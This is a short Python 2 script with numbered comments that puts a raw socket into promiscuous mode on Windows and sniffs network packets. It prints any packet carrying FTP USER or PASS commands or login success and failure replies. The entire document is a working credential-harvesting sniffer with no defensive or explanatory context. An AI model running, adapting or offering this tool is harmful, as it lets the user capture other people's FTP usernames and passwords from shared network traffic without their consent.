import socket
import string

HOST = socket.gethostbyname(socket.gethostname())

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)     #(1)
s.bind((HOST, 0))                                                         #(2)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)                     #(3)
s.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)                              #(4)

while True:
    data = s.recvfrom(65565)                                              #(5)
    printable = set(string.printable)                                     #(6)
    parsedData = ''.join(x if x in printable else '.' for x in data[0])

    if(parsedData.find("USER") > 0):                                      #(7)
        print parsedData
    elif(parsedData.find("PASS") > 0):
        print parsedData
    elif(parsedData.find("530 User cannot log in") > 0):
        print parsedData
    elif(parsedData.find("230 User logged in") > 0):
        print parsedData
